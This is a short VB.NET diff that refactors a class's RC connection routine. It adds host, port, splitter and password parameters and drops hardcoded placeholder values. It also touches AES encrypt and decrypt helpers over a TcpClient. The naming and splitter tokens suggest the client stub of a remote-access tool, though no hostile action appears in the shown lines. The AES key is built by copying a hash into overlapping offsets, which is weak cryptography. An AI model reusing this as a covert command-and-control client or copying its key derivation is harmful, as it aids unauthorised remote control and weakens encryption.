@@ -5,10 +5,14 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal PW As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
 
         KEY = K
-        pass = PW
+        HOST = H
+        PORT = P
+        SPL = SP
+        PASS = PW
+
         Dim lp As Integer = 0
 
         CN = False
@@ -163,7 +167,7 @@ cc:
         Dim encrypted As String = ""
         Try
             Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
             Array.Copy(temp, 0, hash, 0, 16)
             Array.Copy(temp, 0, hash, 15, 16)
             AES.Key = hash
@@ -182,7 +186,7 @@ cc:
         Dim decrypted As String = ""
         Try
             Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
             Array.Copy(temp, 0, hash, 0, 16)
             Array.Copy(temp, 0, hash, 15, 16)
             AES.Key = hash
@@ -196,11 +200,11 @@ cc:
     End Function
 
     Public Shared C As TcpClient = Nothing
-    Public Shared KEY As String = String.Empty
-    Public Shared _H
-    Public Shared _P
-    Public Shared SPL As String = "|'L'|"
+    Public Shared KEY As String
+    Public Shared HOST As String
+    Public Shared PORT As Integer
+    Public Shared SPL As String
+    Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
-    Public Shared pass As String = "|'X'|"
 
 End Class
